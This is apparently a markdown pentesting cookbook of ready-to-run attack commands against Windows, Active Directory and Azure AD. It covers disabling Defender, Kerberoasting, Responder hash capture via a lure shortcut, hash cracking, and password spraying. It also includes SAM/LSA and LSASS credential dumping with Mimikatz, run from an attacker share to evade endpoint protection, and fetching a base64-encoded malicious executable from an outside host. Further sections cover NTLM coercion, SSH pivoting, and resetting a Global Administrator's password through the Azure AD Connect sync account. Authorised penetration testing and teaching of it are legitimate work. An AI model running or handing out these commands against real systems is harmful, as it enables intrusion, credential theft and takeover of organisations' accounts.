# A Pentesting Cookbook
A collection of brief recepies for pentesting

## Operating Systems
### Kali Linux
https://www.kali.org/get-kali/

### Windows 10
https://www.microsoft.com/en-us/software-download/windows10ISO

### Ubuntu
https://ubuntu.com/download/server


## Tools
### CrackMapExec (CME)
https://mpgn.gitbook.io/crackmapexec/
### Responder 
https://github.com/lgandx/Responder
### Impacket
https://github.com/SecureAuthCorp/impacket
### Bloodhound
https://github.com/BloodHoundAD/BloodHound
### Mimikatz
https://github.com/gentilkiwi/mimikatz/wiki
### dnSpy
https://github.com/dnSpy/dnSpy
### Evil WinRM
https://github.com/Hackplayers/evil-winrm 
### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### PetitPotam
https://github.com/topotam/PetitPotam
### DFSCoerce
https://github.com/Wh04m1001/DFSCoerce



## Preparations
### Prepare a Windows 10 test machine
Run the below in powershell with admin permissions on a fresh install of Windows 10

```powershell

Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install sql-server-2019 -y
choco install sql-server-management-studio -y
choco install vscode -y
choco install googlechrome -y
choco install firefox -y
choco install visualstudio2019community -y
choco install github-desktop -y

```

#### Disable Defender Antivirus
Although Microsoft Defender offers a command to disable the antivirus, it's guarded by the Tamper Protection feature, which you can only disable through the Virus & threat protection settings available in the Windows Security app.

Run as admin in powershell 

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Exclude path from Defender Antivirus
Run as admin in powershell 

```powershell
Set-MpPreference -ExclusionPath PATH\TO\FOLDER
```

#### Disable archive scanning in Defender Antivirus
By default, the antivirus scans .zip, .cab, and other archive files, but if you have a reason not to scan archives, you can disable the option with these steps:
Run as admin in powershell 
```powershell
Set-MpPreference -DisableArchiveScanning $true
```

## Recon
### Sniffing
#### Run tcpdump to capture all packets except DNS 

```bash
tcpdump -n -s0 -i eth0 -w [FILENAME].pcap
```

### Enumeration
To enumerate user grups and network shares, you will need credentials. See "Credentials" below for details on credential harvesting.

#### Enumerate devices on the network with ARP Scan
```bash
sudo apt install arp-scan
arp-scan -l > ARPSCAN.txt
```

#### UDP Port scan with Nmap
```bash
sudo nmap -n -P0 -sU -p 111,123,67,68,137,138,161,162,2049 [IP/IP range]
```

#### SMB vulnerability scan with Nmap
```bash
sudo nmap -n -P0 -p 139,445 --script '(smb-vuln*) and not (brute or broadcast or dos or external or fuzzer)' -sV [IP/IP range]
```

ref: https://highon.coffee/blog/nmap-cheat-sheet/  

#### Enumerate domain password policy
##### Kali (Linux)
Using CrackMapExec
```bash
cme smb [IP] -u [UserName] -p '[Password]' --pass-pol
``` 

#### Get all Active Directory Users
##### Kali (Linux)
Using impacket
```bash
GetADUsers.py -all <domain\User> -dc-ip <DC_IP>
```

##### Windows
```cmd
net user /domain
```

##### Windows (Powershell)
```powershell
$search = [adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User)(cn=*))"
$users = $search.FindAll()
foreach($user in $users) {
    $CN = $user.Properties['CN']
    $DisplayName = $user.Properties['DisplayName']
    $SamAccountName = $user.Properties['SamAccountName']
    $description = $user.Properties['description']
    $pwdlastset = $user.Properties['pwdlastset']
    "$displayname,$SamAccountName,$pwdlastset,$description"
}
``` 

#### Get all computer objects in Active Directory
##### Windows
Using Powershell without AD module
```powershell
$AD = [adsisearcher]"objectcategory=computer"$Computers = $AD.FindAll()
$Computers.Properties.Name
$AD = [adsisearcher]"objectcategory=computer
```

#### Get all Active Directory Groups
##### Kali (Linux)
##### Windows
```cmd
net group /domain
```

#### Get all members of Domain Administrators
##### Windows
```cmd
net group “Domain Admins" /domain
```

#### Dump domain info via LDAP
##### Kali (Linux)
```bash
ldapdomaindump -u 'domain\user' -p 'PASS' -d '#' [DC FQDN]
```

#### Resolve hostname output from ldapdomaindump (servers only excluding Windows 7, 10 and 11) 
```bash
cat domain_computers.grep | grep -v 'Windows 7' | grep -v 'Windows 10' | grep -v 'Windows 11' | cut -d'#' -f3 | sed '/^[[:space:]]*$/d' | while read line;do host $line |grep -v 'not found' | cut -d' ' -f1,4 >> ../SERVERS-DNS-IP.txt;done
```

#### Enumerate network shares
### Using CrackMapExec (CME)
Using domain credentials
```bash
crackmapexec smb -u 'USER' -p 'PASS' -d 'DOMAIN' IP --shares
```

Using local credentials
```bash
crackmapexec smb -u 'USER' -p 'PASS' --local-auth IP --shares
```

### Using powershell
```powershell
Invoke-Command -ComputerName 'SERVER01','SERVER02' -ScriptBlock {Get-SmbShare}
```

### Enumerate database servers
Find servers running Microsoft SQL Server
```bash
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER
```

### Enumerate web servers
Using Nmap 
```bash
nmap -sV -Pn --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,http-devframework,http-enum,http-shellshock,http-frontpage-login,http-git,http-iis-webdav-vuln,http-php-version,http-robots.txt,http-shellshock,http-vuln-cve2015-1635 -p 80,443
```

## Credentials
The following techniques can be used to harvest credentials

### Kerberoasting
```bash
impacket-GetUserSPNs -request -dc-ip [Domain Controller IP] -outputfile KerberoastingOut.txt [DOMAIN/UserName]
```
### Kerberoasting using Kerberos Tickets

#### Request Kerberos Ticket (save as .ccache)
```bash
impacket-getTGT DOMAIN.LOCAL/username@DC-FQDN
```
#### Request Kerberos Ticket using NTLM hash
```bash
impacket-getTGT -hashes :XXXXX DOMAIN.LOCAL/username@DC-FQDN
```

#### Request Kerberos Ticket using AESKey
1. Create AESKey using Powershell (https://gist.githubusercontent.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372/raw/a11a17195d33979ee17b5a28de39f753760e3a1f/Get-KerberosAESKey.ps1)
2. Execute the following command

     ```bash
     impacket-getTGT -aesKey XXXX DOMAIN.LOCAL/username@DC-FQDN
     ```
3. Set variable KRB5CCNAME
     ```
     export KRB5CCNAME=/home/kali/username.ccache
     ```

#### Kerberoasting using AESKEY
```
impacket-GetUserSPNs -request -outputfile Kerberoast.txt -no-pass -k -aesKey XXXXXX DOMAIN.LOCAL/username
```

### Responder
Run built-in responder in Kali Linux
```bash
responder -I eth0 -v
```

### Create link file to use with Responder to harvest hashes
Create a vbscript file with the following content and run the script to create a link file on the current desktop.
```vbscript
set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop")
set oShellLink = WshShell.CreateShortcut(strDesktop & "\Support.lnk")
oShellLink.TargetPath = WScript.ScriptFullName
oShellLink.WindowStyle = 1
oShellLink.Hotkey = ""
oShellLink.IconLocation = "\\[IP address]\support\support.ico, 0"  'Zero is the index
oShellLink.Description = "Support"
oShellLink.WorkingDirectory = strDesktop
oShellLink.Save
```

Parse output
```bash
./DumpHash.py
```

### Bloodhound

#### Install Docker
```bash
sudo apt install docker.io
```

#### Install bloodhound-python
1. Run the following code
    ```bash
    git clone https://github.com/fox-it/BloodHound.py.git
    docker build -t bloodhound .
    sudo usermod -aG docker $USER
    ```
2. Log out / Login
 
3. Start bloodhound using docker
    ```bash
    docker run -v ${​​​​​​PWD}​​​​​​:/bloodhound-data -it bloodhound
    bloodhound-python -c all -d domain.local 
    ```

#### Sharphound Ingestor
From a Windows computer. If not domain joined, execute with "runas". 
```powershell
.\SharpHound.exe -c all
```


## Passwords

1. Create a g4dn.xlarge instance with the  [Deep Learning AMI (Ubuntu 18.04)](https://docs.aws.amazon.com/dlami/latest/devguide/ubuntu18-04.html) on AWS
2. Log on to the instance and prepare for cracking:

```bash
git clone https://github.com/jonasonline/cracking-instance && cd cracking-instance && sudo chmod +x PreparePwdCrack.sh && ./PreparePwdCrack.sh
```
3. Create and start a nvidia docker container using **one** of the commands below
 * **Kerberoasting tickets**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 13100 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

 * **NTLM hashes**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 1000 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

 * **NetNTLMv2 hashes**
 ```bash
 nvidia-docker run --rm -t -d -v /var/tmp/pwds:/var/tmp/pwds jonasonline/nvidiahashcat:latest hashcat -a 0 -m 5600 /var/tmp/pwds/input/[hash_file] /var/tmp/pwds/wordlists/[wordlist_file] -o /var/tmp/pwds/output/result.txt -O -r /var/tmp/pwds/rules/password_cracking_rules/OneRuleToRuleThemAll.rule 
 ```

### Password spraying
Use Crackmapexec to test one password for multiple users
```bash
crackmapexec smb 192.168.1.101 -u users.txt -p [password] --continue-on-success
```
ref: https://mpgn.gitbook.io/crackmapexec/smb-protocol/password-spraying

Password spraying with proxychains and smbclient
```bash
cat USERLIST | while read line; do proxychains smbclient -U domain.local\\$line%Vinter2021 -L //IP/ 2>/dev/null > /dev/null && echo "${line}:PASSWORD works"; done
```
#### Verify account against domain controller before password spray
```bash
crackmapexec smb -u '' -p '' -d '' <dc-ip>
``` 

### Brute Force Microsoft SQL Server logins
```bash
nmap -p [PORT] --script ms-sql-brute --script-args userdb=userlist,passdb=/usr/share/wordlists/password.lst,mssql.instance-all [IP]
```

## Exploiting

### Crackmapexec
Extract Password policy
```bash
crackmapexec smb -u 'USER' -p 'PASS' -d 'DOMAIN' IP --pass-pol
```

Extract SAM hashes
```bash
crackmapexec smb -u 'ADMIN' -p 'PASS' -d 'DOMAIN' IP --sam
```

Extract LSA hashes
```bash
crackmapexec smb -u 'ADMIN' -p 'PASS' -d 'DOMAIN' IP --lsa
```

#### Crackmapexec using Kerberos (requires krb5-heimdal)
```bash
export KRB5CCNAME=/home/kali/username.ccache
crackmapexec smb -k FQDN --shares
```

### Mimikatz

Run Mimikatz from local disk
```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

Run Mimikatz from network share to avoid endpoint protection
1. Configure a network share on the attacker machine
    ```bash
    impacket-smbserver [SHARE NAME] [PATH CONTAINING Mimikatz binary]
    ```
2. Start a shell with Impacket wmiexec from the attacker machine
    ```bash
    wmiexec.py "[USERNAME]:[PASSWORD]"@[IP]
    ```
3. Run Mimikatz remote 
    ```bash
    \\IP\SHARE\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
    ```
### Procdump
https://learn.microsoft.com/en-us/sysinternals/downloads/procdump

#### Dumping LSASS memory to dumpfile
```powershell
procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

### Pypykatz
#### Read LSASS dumpfile
```bash
pypykatz minidump lsa lsass.dmp
```

## Defense Evasion

### Convert EXE file to Base64
```bash
cat malicious.exe | base64 -w0 > malicious.b64
```

### Transfer malicious file to client
```powershell
wget http://x.x.x.x/malicious.b64
```
or
```powershell
curl http://x.x.x.x/malicious.b64 -o malicious.b64
```

### Convert Base64 file to EXE using powershell
```powershell
$b64=gc .\malicious.b64
$file='malicious.exe'
[IO.File]::WriteAllBytes($file, [Convert]::FromBase64String($b64))
```
or using oneliner
```powershell
powershell -ep bypass -c "$b64=gc .\MK64.b64;$file='MK64.exe';[IO.File]::WriteAllBytes($file, [Convert]::FromBase64String($b64))"
```

## Force NTLM authentication
### PetitPotam
```bash
sudo python3 Petitpotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
```
### DFSCoerce 
```bash
sudo python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
```

## Pivoting
### SSH Tunneling

Set up key-based authentication:
1. Generate keypair without a passphrase
   ```bash
   ssh-keygen -t rsa -b 2048 -f ~/.ssh/sshtunnel.key -P ""
   ```
   
2. Place content of public key in the *authorized_keys* file   
    ```bash
    cat sshtunnel.key.pub > ~/.ssh/authorized_keys
    ```
    
3. Edit **/etc/ssh/sshd_config** and set *pubkeyauthentication* to "yes" \
   Verify path of AuthorizedKeysFile \
   `#AuthorizedKeysFile     ~/.ssh/authorized_keys .ssh/authorized_keys2`

5. Set strict read-only permissions to the private key file.
    ```bash
    sudo chmod 400 sshtunnel.key
    ```
    
6. On the target Windows system, transfer the private key file *sshtunnel.key* to the **current user's** home directory OR .ssh directory if it exists.\
   `C:\Users\AdminLasse\sshtunnel.key` OR `C:\Users\AdminLasse\.ssh\sshtunnel.key`

7. On the target Windows system, remove any inherited permissions and grant only the current user READ rights to the key file.\
   ```cmd
   icacls sshtunnel.key /inheritance:r
   ```
   ```cmd
   icacls sshtunnel.key /grant:r "%username%":"(R)"
   ```

#### Remote Port Forwarding
Forward Kali machine's port 33389 to *[remote_target_IP]* port 3389 from already compromised host (pivoting point)
```cmd
ssh -i sshtunnel.key -R 33389:[remote_target_IP]:3389 [kali_user]@[kali_IP] -o StrictHostKeyChecking=no -N
```

#### Local Port Forwarding
From Kali: Forward inaccessible port (0.0.0.0:80) on compromised host to Kali's local port 8888 (with key)
```bash
ssh -i sshtunnel.key -L 0.0.0.0:80:localhost:8888 [kali_user]@[kali_IP] -o StrictHostKeyChecking=no -N
```

#### Dynamic Port Forwarding
SOCKS proxy on port 1080.\
Edit */etc/proxychains4.conf* and add line `socks5 127.0.0.1 1080` \
Edit */etc/ssh/sshd_config* and set `AllowTcpForwarding yes` 
```bash
#From compromised host
ssh -R 1080 [kali_user]@[kali_IP] -N
```
Internal network behind compromised host can be reached from Kali by prepending `proxychains -q` to a command.


## Azure Active Directory
Run AzureHound (https://github.com/BloodHoundAD/AzureHound) to enumerate Azure users, groups, roles, apps etc.
```bash
azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o "mytenant.json"
```
AzureHound custom queries cheat sheet: https://github.com/LuemmelSec/Custom-BloodHound-Queries

### Pivoting to Azure AD from on-prem AD
Connect to Azure AD Connect Server via Evil-WinRM
```powershell
# Update Execution Policy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# Install Azure AD Module
Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force
```

Install AzureAD PowerShell Module
```powershell
Import-Module AzureAD
```

Connect to AzureAD from PowerShell
```powershell
Connect-AzureAD
```

#### Determine Azure AD Integration Method:

When Password Hash Synchronization is configured, a couple of privileged accounts are created. \
`MSOL_<installation_ID>` and `Sync_<name_of_on-prem_ADConnect_server>_<installationID>` \
Run the following commands. If these accounts exist, PHS is configured = **Azure AD Connect** \
The first command will also tell you which server(s) is running Azure AD Connect
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Azure AD Privilege Escalation (Azure AD Connect/PHS)
Connect to a server running Azure AD Connect (gathered from above command) and install AADInternals\
https://github.com/Gerenios/AADInternals
```powershell
Install-Module AADInternals
Import-Module AADInternals
```

Get the SyncCredentials (cleartext password of the **Sync_** account)
```powershell
Get-AADIntSyncCredentials
```

Disconnect from the previous Azure session and login with the Sync account
```powershell
Disconnect-AzureAD

Connect-AzureAD
#Provide UPN and password
```

Obtain the *ImmutableId* of a Global Administrator
```powershell
Get-AADIntUser -UserPrincipalName admin@domain.onmicrosoft.com | select ImmutableId
```

Change the admin's password
```powershell
Set-AADIntUserPassword -SourceAnchor "[admin's ImmutableId]" -Password "p@zzw0Rd_1337" -Verbose
```

